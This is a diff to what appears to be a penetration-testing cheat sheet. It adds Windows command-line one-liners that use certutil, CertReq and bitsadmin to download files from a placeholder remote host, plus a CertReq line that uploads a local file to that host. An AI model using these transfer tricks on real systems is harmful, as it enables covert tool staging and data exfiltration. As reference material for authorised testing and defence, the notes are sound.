@@ -62,11 +62,21 @@ socat -dd TCP4-LISTEN:<port> STDOUT                       #local
 
 ## CMD
 
-#### Download files
+#### File transfer
+
+Download
 
 ```
-cmd.exe /c certutil -urlcache -split -f http://<ip>/<file> <local path>
-cmd.exe /c bitsadmin  /transfer downloadjob /download /priority priority <url> <local file path>
+cmd.exe /c certutil.exe -urlcache -split -f http://<ip>/<file> <local path>
+cmd.exe /c certutil.exe -verifyctl -f -split http://<ip>/<file> <local path>
+cmd.exe /c CertReq -Post -config https://<ip> c:\windows\win.ini <local path>
+cmd.exe /c bitsadmin /transfer downloadjob /download /priority high <url> <local path>
+```
+
+Upload
+
+```
+cmd.exe /c CertReq -Post -config https://<ip> <file> and show response in terminal
 ```
 
 ## Powershell
